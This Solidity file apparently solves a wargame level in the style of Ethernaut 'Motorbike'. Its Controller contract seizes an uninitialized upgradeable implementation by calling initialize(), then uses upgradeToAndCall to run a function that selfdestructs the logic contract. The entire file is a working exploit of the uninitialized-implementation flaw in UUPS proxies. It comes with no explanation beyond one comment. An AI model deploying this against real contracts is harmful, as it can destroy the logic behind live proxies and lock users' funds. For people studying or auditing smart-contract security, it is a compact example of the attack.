// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

interface Engine {
    function initialize() external;
    function horsePower () external returns ( uint256);

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

//check the chain, implementation is uninitialized contract uninitialized

contract Controller {
    function post(address _engine) public {
        Engine(_engine).initialize();
        Engine(_engine).upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("cook()")
        );
    }

    function cook() public {
        selfdestruct(tx.origin);
    }
}
